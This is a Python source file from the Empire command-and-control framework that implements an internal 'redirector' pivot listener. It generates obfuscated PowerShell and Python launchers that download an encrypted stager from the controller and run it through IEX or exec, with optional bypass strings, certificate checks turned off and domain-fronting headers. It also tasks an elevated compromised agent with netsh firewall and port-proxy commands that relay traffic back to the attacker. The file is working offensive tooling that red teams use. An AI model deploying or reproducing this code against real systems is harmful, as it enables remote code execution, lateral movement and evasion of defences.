from __future__ import print_function

import base64
import copy
import os
import random
from builtins import object, str
from typing import List

from empire.server.common import encryption, helpers, packets, templating
from empire.server.database import models
from empire.server.database.base import Session
from empire.server.utils import data_util, listener_util


class Listener(object):
    def __init__(self, mainMenu, params=[]):

        self.info = {
            "Name": "redirector",
            "Author": ["@xorrior"],
            "Description": (
                "Internal redirector listener. Active agent required. Listener options will be copied from another existing agent. Requires the active agent to be in an elevated context."
            ),
            # categories - client_server, peer_to_peer, broadcast, third_party
            "Category": ("peer_to_peer"),
            "Comments": [],
        }

        # any options needed by the stager, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            "Name": {
                "Description": "Listener name. This needs to be the name of the agent that will serve as the internal pivot",
                "Required": True,
                "Value": "",
            },
            "internalIP": {
                "Description": "Internal IP address of the agent. Yes, this could be pulled from the db but it becomes tedious when there is multiple addresses.",
                "Required": True,
                "Value": "",
            },
            "ListenPort": {
                "Description": "Port for the agent to listen on.",
                "Required": True,
                "Value": 80,
            },
            "Listener": {
                "Description": "Name of the listener to clone",
                "Required": True,
                "Value": "",
            },
        }

        # required:
        self.mainMenu = mainMenu
        self.threads = {}  # used to keep track of any threaded instances of this server

        # optional/specific for this module

        # set the default staging key to the controller db default
        # self.options['StagingKey']['Value'] = str(helpers.get_config('staging_key')[0])

    def default_response(self):
        """
        If there's a default response expected from the server that the client needs to ignore,
        (i.e. a default HTTP page), put the generation here.
        """
        print(
            helpers.color("[!] default_response() not implemented for pivot listeners")
        )
        return b""

    def validate_options(self):
        """
        Validate all options for this listener.
        """

        for key in self.options:
            if self.options[key]["Required"] and (
                str(self.options[key]["Value"]).strip() == ""
            ):
                print(helpers.color('[!] Option "%s" is required.' % (key)))
                return False

        return True

    def generate_launcher(
        self,
        encode=True,
        obfuscate=False,
        obfuscationCommand="",
        userAgent="default",
        proxy="default",
        proxyCreds="default",
        stagerRetries="0",
        language=None,
        safeChecks="",
        listenerName=None,
        bypasses: List[str] = None,
    ):
        """
        Generate a basic launcher for the specified listener.
        """
        bypasses = [] if bypasses is None else bypasses

        if not language:
            print(
                helpers.color(
                    "[!] listeners/template generate_launcher(): no language specified!"
                )
            )
            return None

        if listenerName and (listenerName in self.mainMenu.listeners.activeListeners):

            # extract the set options for this instantiated listener
            listenerOptions = self.mainMenu.listeners.activeListeners[listenerName][
                "options"
            ]
            host = listenerOptions["Host"]["Value"]
            launcher = listenerOptions["Launcher"]["Value"]
            stagingKey = listenerOptions["StagingKey"]["Value"]
            profile = listenerOptions["DefaultProfile"]["Value"]
            uris = [a for a in profile.split("|")[0].split(",")]
            stage0 = random.choice(uris)
            customHeaders = profile.split("|")[2:]

            if language.startswith("po"):
                # PowerShell

                stager = '$ErrorActionPreference = "SilentlyContinue";'
                if safeChecks.lower() == "true":
                    stager = "If($PSVersionTable.PSVersion.Major -ge 3){"

                    for bypass in bypasses:
                        stager += bypass
                    stager += "};[System.Net.ServicePointManager]::Expect100Continue=0;"

                stager += "$wc=New-Object System.Net.WebClient;"

                if userAgent.lower() == "default":
                    profile = listenerOptions["DefaultProfile"]["Value"]
                    userAgent = profile.split("|")[1]
                stager += f"$u='{ userAgent }';"

                if "https" in host:
                    # allow for self-signed certificates for https connections
                    stager += "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};"

                if userAgent.lower() != "none" or proxy.lower() != "none":

                    if userAgent.lower() != "none":
                        stager += "$wc.Headers.Add('User-Agent',$u);"

                    if proxy.lower() != "none":
                        if proxy.lower() == "default":
                            stager += (
                                "$wc.Proxy=[System.Net.WebRequest]::DefaultWebProxy;"
                            )

                        else:
                            # TODO: implement form for other proxy
                            stager += (
                                f"$proxy=New-Object Net.WebProxy('{ proxy.lower() }');"
                            )
                            stager += "$wc.Proxy = $proxy;"

                        if proxyCreds.lower() == "default":
                            stager += "$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;"

                        else:
                            # TODO: implement form for other proxy credentials
                            username = proxyCreds.split(":")[0]
                            password = proxyCreds.split(":")[1]
                            if len(username.split("\\")) > 1:
                                usr = username.split("\\")[1]
                                domain = username.split("\\")[0]
                                stager += f"$netcred = New-Object System.Net.NetworkCredential('{usr}','{password}','{domain}');"

                            else:
                                usr = username.split("\\")[0]
                                stager += f"$netcred = New-Object System.Net.NetworkCredential('{usr}','{password}');"

                            stager += "$wc.Proxy.Credentials = $netcred;"

                        # save the proxy settings to use during the entire staging process and the agent
                        stager += "$Script:Proxy = $wc.Proxy;"

                # TODO: reimplement stager retries?
                # check if we're using IPv6
                listenerOptions = copy.deepcopy(listenerOptions)
                bindIP = listenerOptions["BindIP"]["Value"]
                port = listenerOptions["Port"]["Value"]
                if ":" in bindIP:
                    if "http" in host:
                        if "https" in host:
                            host = (
                                "https://" + "[" + str(bindIP) + "]" + ":" + str(port)
                            )
                        else:
                            host = "http://" + "[" + str(bindIP) + "]" + ":" + str(port)

                # code to turn the key string into a byte array
                stager += (
                    f"$K=[System.Text.Encoding]::ASCII.GetBytes('{ stagingKey }');"
                )

                # this is the minimized RC4 stager code from rc4.ps1
                stager += listener_util.powershell_rc4()

                # prebuild the request routing packet for the launcher
                routingPacket = packets.build_routing_packet(
                    stagingKey,
                    sessionID="00000000",
                    language="POWERSHELL",
                    meta="STAGE0",
                    additional="None",
                    encData="",
                )
                b64RoutingPacket = base64.b64encode(routingPacket).decode("utf-8")

                # stager += "$ser="+helpers.obfuscate_call_home_address(host)+";$t='"+stage0+"';"
                stager += f"$ser={helpers.obfuscate_call_home_address(host)};$t='{stage0}';$hop='{listenerName}';"

                # Add custom headers if any
                if customHeaders != []:
                    for header in customHeaders:
                        headerKey = header.split(":")[0]
                        headerValue = header.split(":")[1]
                        # If host header defined, assume domain fronting is in use and add a call to the base URL first
                        # this is a trick to keep the true host name from showing in the TLS SNI portion of the client hello
                        if headerKey.lower() == "host":
                            stager += "try{$ig=$wc.DownloadData($ser)}catch{};"

                        stager += f'$wc.Headers.Add("{headerKey}","{headerValue}");'

                # add the RC4 packet to a cookie

                stager += f'$wc.Headers.Add("Cookie","session={b64RoutingPacket}");'
                stager += "$data=$wc.DownloadData($ser+$t);"
                stager += "$iv=$data[0..3];$data=$data[4..$data.length];"

                # decode everything and kick it over to IEX to kick off execution
                stager += "-join[Char[]](& $R $data ($IV+$K))|IEX"

                # Remove comments and make one line
                stager = helpers.strip_powershell_comments(stager)
                stager = data_util.ps_convert_to_oneliner(stager)

                if obfuscate:
                    stager = data_util.obfuscate(
                        self.mainMenu.installPath,
                        stager,
                        obfuscationCommand=obfuscationCommand,
                    )
                # base64 encode the stager and return it
                if encode and (
                    (not obfuscate) or ("launcher" not in obfuscationCommand.lower())
                ):
                    return helpers.powershell_launcher(stager, launcher)
                else:
                    # otherwise return the case-randomized stager
                    return stager

            if language.startswith("py"):
                # Python

                launcherBase = "import sys;"
                if "https" in host:
                    # monkey patch ssl woohooo
                    launcherBase += "import ssl;\nif hasattr(ssl, '_create_unverified_context'):ssl._create_default_https_context = ssl._create_unverified_context;\n"

                try:
                    if safeChecks.lower() == "true":
                        launcherBase += listener_util.python_safe_checks()
                except Exception as e:
                    p = "[!] Error setting LittleSnitch in stager: " + str(e)
                    print(helpers.color(p, color="red"))

                if userAgent.lower() == "default":
                    profile = listenerOptions["DefaultProfile"]["Value"]
                    userAgent = profile.split("|")[1]

                launcherBase += "import urllib.request;\n"
                launcherBase += "UA='%s';" % (userAgent)
                launcherBase += "server='%s';t='%s';" % (host, stage0)

                # prebuild the request routing packet for the launcher
                routingPacket = packets.build_routing_packet(
                    stagingKey,
                    sessionID="00000000",
                    language="PYTHON",
                    meta="STAGE0",
                    additional="None",
                    encData="",
                )
                b64RoutingPacket = base64.b64encode(routingPacket).decode("utf-8")

                launcherBase += "req=urllib.request.Request(server+t);\n"
                # add the RC4 packet to a cookie
                launcherBase += "req.add_header('User-Agent',UA);\n"
                launcherBase += "req.add_header('Cookie',\"session=%s\");\n" % (
                    b64RoutingPacket
                )

                # Add custom headers if any
                if customHeaders != []:
                    for header in customHeaders:
                        headerKey = header.split(":")[0]
                        headerValue = header.split(":")[1]
                        # launcherBase += ",\"%s\":\"%s\"" % (headerKey, headerValue)
                        launcherBase += 'req.add_header("%s","%s");\n' % (
                            headerKey,
                            headerValue,
                        )

                if proxy.lower() != "none":
                    if proxy.lower() == "default":
                        launcherBase += "proxy = urllib.request.ProxyHandler();\n"
                    else:
                        proto = proxy.Split(":")[0]
                        launcherBase += (
                            "proxy = urllib.request.ProxyHandler({'"
                            + proto
                            + "':'"
                            + proxy
                            + "'});\n"
                        )

                    if proxyCreds != "none":
                        if proxyCreds == "default":
                            launcherBase += "o = urllib.request.build_opener(proxy);\n"
                        else:
                            launcherBase += "proxy_auth_handler = urllib.request.ProxyBasicAuthHandler();\n"
                            username = proxyCreds.split(":")[0]
                            password = proxyCreds.split(":")[1]
                            launcherBase += (
                                "proxy_auth_handler.add_password(None,'"
                                + proxy
                                + "','"
                                + username
                                + "','"
                                + password
                                + "');\n"
                            )
                            launcherBase += "o = urllib.request.build_opener(proxy, proxy_auth_handler);\n"
                    else:
                        launcherBase += "o = urllib.request.build_opener(proxy);\n"
                else:
                    launcherBase += "o = urllib.request.build_opener();\n"

                # install proxy and creds globally, so they can be used with urlopen.
                launcherBase += "urllib.request.install_opener(o);\n"
                launcherBase += "a=urllib.request.urlopen(req).read();\n"

                # download the stager and extract the IV
                launcherBase += listener_util.python_extract_stager(stagingKey)

                if encode:
                    launchEncoded = base64.b64encode(
                        launcherBase.encode("UTF-8")
                    ).decode("UTF-8")
                    launcher = (
                        "echo \"import sys,base64,warnings;warnings.filterwarnings('ignore');exec(base64.b64decode('%s'));\" | python3 &"
                        % launchEncoded
                    )
                    return launcher
                else:
                    return launcherBase

            if language.startswith("csh"):
                workingHours = listenerOptions["WorkingHours"]["Value"]
                killDate = listenerOptions["KillDate"]["Value"]
                customHeaders = profile.split("|")[2:]
                delay = listenerOptions["DefaultDelay"]["Value"]
                jitter = listenerOptions["DefaultJitter"]["Value"]
                lostLimit = listenerOptions["DefaultLostLimit"]["Value"]

                with open(
                    self.mainMenu.installPath + "/stagers/Sharpire.yaml", "rb"
                ) as f:
                    stager_yaml = f.read()
                stager_yaml = stager_yaml.decode("UTF-8")
                stager_yaml = (
                    stager_yaml.replace("{{ REPLACE_ADDRESS }}", host)
                    .replace("{{ REPLACE_SESSIONKEY }}", stagingKey)
                    .replace("{{ REPLACE_PROFILE }}", profile)
                    .replace("{{ REPLACE_WORKINGHOURS }}", workingHours)
                    .replace("{{ REPLACE_KILLDATE }}", killDate)
                    .replace("{{ REPLACE_DELAY }}", str(delay))
                    .replace("{{ REPLACE_JITTER }}", str(jitter))
                    .replace("{{ REPLACE_LOSTLIMIT }}", str(lostLimit))
                )

                compiler = self.mainMenu.loadedPlugins.get("csharpserver")
                if not compiler.status == "ON":
                    print(helpers.color("[!] csharpserver plugin not running"))
                else:
                    file_name = compiler.do_send_stager(
                        stager_yaml, "Sharpire", confuse=obfuscate
                    )
                    return file_name

            else:
                print(
                    helpers.color(
                        "[!] listeners/template generate_launcher(): invalid language specification: only 'powershell' and 'python' are current supported for this module."
                    )
                )

        else:
            print(
                helpers.color(
                    "[!] listeners/template generate_launcher(): invalid listener name specification!"
                )
            )

    def generate_stager(
        self,
        listenerOptions,
        encode=False,
        encrypt=True,
        obfuscate=False,
        obfuscationCommand="",
        language=None,
    ):
        """
        If you want to support staging for the listener module, generate_stager must be
        implemented to return the stage1 key-negotiation stager code.
        """
        if not language:
            print(
                helpers.color(
                    "[!] listeners/http generate_stager(): no language specified!"
                )
            )
            return None

        profile = listenerOptions["DefaultProfile"]["Value"]
        uris = [a.strip("/") for a in profile.split("|")[0].split(",")]
        launcher = listenerOptions["Launcher"]["Value"]
        stagingKey = listenerOptions["StagingKey"]["Value"]
        workingHours = listenerOptions["WorkingHours"]["Value"]
        killDate = listenerOptions["KillDate"]["Value"]
        host = listenerOptions["Host"]["Value"]
        customHeaders = profile.split("|")[2:]

        # select some random URIs for staging from the main profile
        stage1 = random.choice(uris)
        stage2 = random.choice(uris)

        if language.lower() == "powershell":
            template_path = [
                os.path.join(self.mainMenu.installPath, "/data/agent/stagers"),
                os.path.join(self.mainMenu.installPath, "./data/agent/stagers"),
            ]

            eng = templating.TemplateEngine(template_path)
            template = eng.get_template("http/http.ps1")

            template_options = {
                "working_hours": workingHours,
                "kill_date": killDate,
                "staging_key": stagingKey,
                "profile": profile,
                "session_cookie": self.session_cookie,
                "host": host,
                "stage_1": stage1,
                "stage_2": stage2,
            }
            stager = template.render(template_options)

            # Get the random function name generated at install and patch the stager with the proper function name
            stager = data_util.keyword_obfuscation(stager)

            # make sure the server ends with "/"
            if not host.endswith("/"):
                host += "/"

            # Patch in custom Headers
            remove = []
            if customHeaders != []:
                for key in customHeaders:
                    value = key.split(":")
                    if "cookie" in value[0].lower() and value[1]:
                        continue
                    remove += value
                headers = ",".join(remove)
                stager = stager.replace(
                    '$customHeaders = "";', f'$customHeaders = "{headers}";'
                )

            stagingKey = stagingKey.encode("UTF-8")
            unobfuscated_stager = listener_util.remove_lines_comments(stager)

            if obfuscate:
                unobfuscated_stager = data_util.obfuscate(
                    self.mainMenu.installPath,
                    unobfuscated_stager,
                    obfuscationCommand=obfuscationCommand,
                )
            # base64 encode the stager and return it
            if encode:
                return helpers.enc_powershell(unobfuscated_stager)
            elif encrypt:
                RC4IV = os.urandom(4)
                return RC4IV + encryption.rc4(RC4IV + stagingKey, unobfuscated_stager)
            else:
                return unobfuscated_stager

        elif language.lower() == "python":
            template_path = [
                os.path.join(self.mainMenu.installPath, "/data/agent/stagers"),
                os.path.join(self.mainMenu.installPath, "./data/agent/stagers"),
            ]

            eng = templating.TemplateEngine(template_path)
            template = eng.get_template("http/http.py")

            template_options = {
                "working_hours": workingHours,
                "kill_date": killDate,
                "staging_key": stagingKey,
                "profile": profile,
                "session_cookie": self.session_cookie,
                "host": host,
                "stage_1": stage1,
                "stage_2": stage2,
            }
            stager = template.render(template_options)

            # base64 encode the stager and return it
            if encode:
                return base64.b64encode(stager)
            if encrypt:
                # return an encrypted version of the stager ("normal" staging)
                RC4IV = os.urandom(4)
                return RC4IV + encryption.rc4(RC4IV + stagingKey, stager)
            else:
                # otherwise return the standard stager
                return stager

        else:
            print(
                helpers.color(
                    "[!] listeners/http generate_stager(): invalid language specification, only 'powershell' and 'python' are currently supported for this module."
                )
            )

    def generate_agent(
        self,
        listenerOptions,
        language=None,
        obfuscate=False,
        obfuscationCommand="",
        version="",
    ):
        """
        If you want to support staging for the listener module, generate_agent must be
        implemented to return the actual staged agent code.
        """
        if not language:
            print(
                helpers.color(
                    "[!] listeners/http generate_agent(): no language specified!"
                )
            )
            return None

        language = language.lower()
        delay = listenerOptions["DefaultDelay"]["Value"]
        jitter = listenerOptions["DefaultJitter"]["Value"]
        profile = listenerOptions["DefaultProfile"]["Value"]
        lostLimit = listenerOptions["DefaultLostLimit"]["Value"]
        killDate = listenerOptions["KillDate"]["Value"]
        workingHours = listenerOptions["WorkingHours"]["Value"]
        b64DefaultResponse = base64.b64encode(self.default_response())

        if language == "powershell":

            with open(self.mainMenu.installPath + "/data/agent/agent.ps1") as f:
                code = f.read()
            # Get the random function name generated at install and patch the stager with the proper function name
            code = data_util.keyword_obfuscation(code)

            # strip out comments and blank lines
            code = helpers.strip_powershell_comments(code)

            # patch in the delay, jitter, lost limit, and comms profile
            code = code.replace("$AgentDelay = 60", "$AgentDelay = " + str(delay))
            code = code.replace("$AgentJitter = 0", "$AgentJitter = " + str(jitter))
            code = code.replace(
                '$Profile = "/admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"',
                '$Profile = "' + str(profile) + '"',
            )
            code = code.replace("$LostLimit = 60", "$LostLimit = " + str(lostLimit))
            code = code.replace(
                '$DefaultResponse = ""',
                '$DefaultResponse = "' + str(b64DefaultResponse) + '"',
            )

            # patch in the killDate and workingHours if they're specified
            if killDate != "":
                code = code.replace(
                    "$KillDate,", "$KillDate = '" + str(killDate) + "',"
                )
            if obfuscate:
                code = data_util.obfuscate(
                    self.mainMenu.installPath,
                    code,
                    obfuscationCommand=obfuscationCommand,
                )
            return code

        elif language == "python":
            if version == "ironpython":
                f = open(self.mainMenu.installPath + "/data/agent/ironpython_agent.py")
            else:
                f = open(self.mainMenu.installPath + "/data/agent/agent.py")
            code = f.read()
            f.close()

            # strip out comments and blank lines
            code = helpers.strip_python_comments(code)

            # patch in the delay, jitter, lost limit, and comms profile
            code = code.replace("delay = 60", "delay = %s" % (delay))
            code = code.replace("jitter = 0.0", "jitter = %s" % (jitter))
            code = code.replace(
                'profile = "/admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"',
                'profile = "%s"' % (profile),
            )
            code = code.replace("lostLimit = 60", "lostLimit = %s" % (lostLimit))
            code = code.replace(
                'defaultResponse = base64.b64decode("")',
                'defaultResponse = base64.b64decode("%s")' % (b64DefaultResponse),
            )

            # patch in the killDate and workingHours if they're specified
            if killDate != "":
                code = code.replace('killDate = ""', 'killDate = "%s"' % (killDate))
            if workingHours != "":
                code = code.replace(
                    'workingHours = ""', 'workingHours = "%s"' % (killDate)
                )

            return code
        elif language == "csharp":
            # currently the agent is stageless so do nothing
            code = ""
            return code
        else:
            print(
                helpers.color(
                    "[!] listeners/http generate_agent(): invalid language specification, only 'powershell' and 'python' are currently supported for this module."
                )
            )

    def generate_comms(self, listenerOptions, language=None):
        """
        Generate just the agent communication code block needed for communications with this listener.
        This is so agents can easily be dynamically updated for the new listener.

        This should be implemented for the module.
        """
        host = listenerOptions["Host"]["Value"]

        if language:
            if language.lower() == "powershell":
                template_path = [
                    os.path.join(self.mainMenu.installPath, "/data/agent/stagers"),
                    os.path.join(self.mainMenu.installPath, "./data/agent/stagers"),
                ]

                eng = templating.TemplateEngine(template_path)
                template = eng.get_template("http/http.ps1")

                template_options = {
                    "session_cookie": self.session_cookie,
                    "host": host,
                }

                comms = template.render(template_options)
                return comms

            elif language.lower() == "python":
                template_path = [
                    os.path.join(self.mainMenu.installPath, "/data/agent/stagers"),
                    os.path.join(self.mainMenu.installPath, "./data/agent/stagers"),
                ]
                eng = templating.TemplateEngine(template_path)
                template = eng.get_template("http/comms.py")

                template_options = {
                    "session_cookie": self.session_cookie,
                    "host": host,
                }

                comms = template.render(template_options)
                return comms

            else:
                print(
                    helpers.color(
                        "[!] listeners/http generate_comms(): invalid language specification, only 'powershell' and 'python' are currently supported for this module."
                    )
                )
        else:
            print(
                helpers.color(
                    "[!] listeners/http generate_comms(): no language specified!"
                )
            )

    def start(self, name=""):
        """
        If a server component needs to be started, implement the kick off logic
        here and the actual server code in another function to facilitate threading
        (i.e. start_server() in the http listener).
        """

        tempOptions = copy.deepcopy(self.options)
        listenerName = self.options["Listener"]["Value"]
        # validate that the Listener does exist
        if self.mainMenu.listeners.is_listener_valid(listenerName):
            # check if a listener for the agent already exists

            if self.mainMenu.listeners.is_listener_valid(tempOptions["Name"]["Value"]):
                print(
                    helpers.color(
                        "[!] Pivot listener already exists on agent %s"
                        % (tempOptions["Name"]["Value"])
                    )
                )
                return False

            listenerOptions = self.mainMenu.listeners.activeListeners[listenerName][
                "options"
            ]
            sessionID = self.mainMenu.agents.get_agent_id_db(
                tempOptions["Name"]["Value"]
            )
            isElevated = self.mainMenu.agents.is_agent_elevated(sessionID)

            if self.mainMenu.agents.is_agent_present(sessionID) and isElevated:

                if self.mainMenu.agents.get_language_db(sessionID).startswith(
                    "po"
                ) or self.mainMenu.agents.get_language_db(sessionID).startswith("csh"):
                    # logic for powershell agents
                    script = """
        function Invoke-Redirector {
            param($FirewallName, $ListenAddress, $ListenPort, $ConnectHost, [switch]$Reset, [switch]$ShowAll)
            if($ShowAll){
                $out = netsh interface portproxy show all
                if($out){
                    $out
                }
                else{
                    "[*] no redirectors currently configured"
                }
            }
            elseif($Reset){
                Netsh.exe advfirewall firewall del rule name="$FirewallName"
                $out = netsh interface portproxy reset
                if($out){
                    $out
                }
                else{
                    "[+] successfully removed all redirectors"
                }
            }
            else{
                if((-not $ListenPort)){
                    "[!] netsh error: required option not specified"
                }
                else{
                    $ConnectAddress = ""
                    $ConnectPort = ""

                    $parts = $ConnectHost -split(":")
                    if($parts.Length -eq 2){
                        # if the form is http[s]://HOST or HOST:PORT
                        if($parts[0].StartsWith("http")){
                            $ConnectAddress = $parts[1] -replace "//",""
                            if($parts[0] -eq "https"){
                                $ConnectPort = "443"
                            }
                            else{
                                $ConnectPort = "80"
                            }
                        }
                        else{
                            $ConnectAddress = $parts[0]
                            $ConnectPort = $parts[1]
                        }
                    }
                    elseif($parts.Length -eq 3){
                        # if the form is http[s]://HOST:PORT
                        $ConnectAddress = $parts[1] -replace "//",""
                        $ConnectPort = $parts[2]
                    }
                    if($ConnectPort -ne ""){
                        Netsh.exe advfirewall firewall add rule name=`"$FirewallName`" dir=in action=allow protocol=TCP localport=$ListenPort enable=yes
                        $out = netsh interface portproxy add v4tov4 listenaddress=$ListenAddress listenport=$ListenPort connectaddress=$ConnectAddress connectport=$ConnectPort protocol=tcp
                        if($out){
                            $out
                        }
                        else{
                            "[+] successfully added redirector on port $ListenPort to $ConnectHost"
                        }
                    }
                    else{
                        "[!] netsh error: host not in http[s]://HOST:[PORT] format"
                    }
                }
            }
        }
        Invoke-Redirector"""

                    script += " -ConnectHost %s" % (listenerOptions["Host"]["Value"])
                    script += " -ConnectPort %s" % (listenerOptions["Port"]["Value"])
                    script += " -ListenAddress %s" % (
                        tempOptions["internalIP"]["Value"]
                    )
                    script += " -ListenPort %s" % (tempOptions["ListenPort"]["Value"])
                    script += " -FirewallName %s" % (sessionID)

                    # clone the existing listener options
                    self.options = copy.deepcopy(listenerOptions)

                    for option, values in self.options.items():

                        if option.lower() == "name":
                            self.options[option]["Value"] = sessionID

                        elif option.lower() == "host":
                            if self.options[option]["Value"].startswith("https://"):
                                host = "https://%s:%s" % (
                                    tempOptions["internalIP"]["Value"],
                                    tempOptions["ListenPort"]["Value"],
                                )
                                self.options[option]["Value"] = host
                            else:
                                host = "http://%s:%s" % (
                                    tempOptions["internalIP"]["Value"],
                                    tempOptions["ListenPort"]["Value"],
                                )
                                self.options[option]["Value"] = host

                    # check to see if there was a host value at all
                    if "Host" not in list(self.options.keys()):
                        self.options["Host"]["Value"] = host

                    self.mainMenu.agents.add_agent_task_db(
                        tempOptions["Name"]["Value"], "TASK_SHELL", script
                    )
                    msg = "Tasked agent to install Pivot listener "
                    self.mainMenu.agents.save_agent_log(
                        tempOptions["Name"]["Value"], msg
                    )

                    return True

                elif self.mainMenu.agents.get_language_db(
                    self.options["Name"]["Value"]
                ).startswith("py"):

                    # not implemented
                    script = """
                    """

                    print(helpers.color("[!] Python pivot listener not implemented"))
                    return False

                else:
                    print(
                        helpers.color(
                            "[!] Unable to determine the language for the agent"
                        )
                    )

            else:
                if not isElevated:
                    print(
                        helpers.color("[!] Agent must be elevated to run a redirector")
                    )
                else:
                    print(helpers.color("[!] Agent is not present in the cache"))
                return False

    def shutdown(self, name=""):
        """
        If a server component was started, implement the logic that kills the particular
        named listener here.
        """
        if name and name != "":
            print(helpers.color("[!] Killing listener '%s'" % (name)))

            sessionID = self.mainMenu.agents.get_agent_id_db(name)
            isElevated = self.mainMenu.agents.is_agent_elevated(sessionID)
            if self.mainMenu.agents.is_agent_present(name) and isElevated:

                if self.mainMenu.agents.get_language_db(sessionID).startswith("po"):

                    script = """
                function Invoke-Redirector {
                    param($FirewallName, $ListenAddress, $ListenPort, $ConnectHost, [switch]$Reset, [switch]$ShowAll)
                    if($ShowAll){
                        $out = netsh interface portproxy show all
                        if($out){
                            $out
                        }
                        else{
                            "[*] no redirectors currently configured"
                        }
                    }
                    elseif($Reset){
                        Netsh.exe advfirewall firewall del rule name="$FirewallName"
                        $out = netsh interface portproxy reset
                        if($out){
                            $out
                        }
                        else{
                            "[+] successfully removed all redirectors"
                        }
                    }
                    else{
                        if((-not $ListenPort)){
                            "[!] netsh error: required option not specified"
                        }
                        else{
                            $ConnectAddress = ""
                            $ConnectPort = ""

                            $parts = $ConnectHost -split(":")
                            if($parts.Length -eq 2){
                                # if the form is http[s]://HOST or HOST:PORT
                                if($parts[0].StartsWith("http")){
                                    $ConnectAddress = $parts[1] -replace "//",""
                                    if($parts[0] -eq "https"){
                                        $ConnectPort = "443"
                                    }
                                    else{
                                        $ConnectPort = "80"
                                    }
                                }
                                else{
                                    $ConnectAddress = $parts[0]
                                    $ConnectPort = $parts[1]
                                }
                            }
                            elseif($parts.Length -eq 3){
                                # if the form is http[s]://HOST:PORT
                                $ConnectAddress = $parts[1] -replace "//",""
                                $ConnectPort = $parts[2]
                            }
                            if($ConnectPort -ne ""){
                                Netsh.exe advfirewall firewall add rule name=`"$FirewallName`" dir=in action=allow protocol=TCP localport=$ListenPort enable=yes
                                $out = netsh interface portproxy add v4tov4 listenaddress=$ListenAddress listenport=$ListenPort connectaddress=$ConnectAddress connectport=$ConnectPort protocol=tcp
                                if($out){
                                    $out
                                }
                                else{
                                    "[+] successfully added redirector on port $ListenPort to $ConnectHost"
                                }
                            }
                            else{
                                "[!] netsh error: host not in http[s]://HOST:[PORT] format"
                            }
                        }
                    }
                }
                Invoke-Redirector"""

                    script += " -Reset"
                    script += " -FirewallName %s" % (sessionID)

                    self.mainMenu.agents.add_agent_task_db(
                        sessionID, "TASK_SHELL", script
                    )
                    msg = "Tasked agent to uninstall Pivot listener "
                    self.mainMenu.agents.save_agent_log(sessionID, msg)

                elif self.mainMenu.agents.get_language_db(sessionID).startswith("py"):

                    print(helpers.color("[!] Shutdown not implemented for python"))

            else:
                print(
                    helpers.color(
                        "[!] Agent is not present in the cache or not elevated"
                    )
                )

        pass
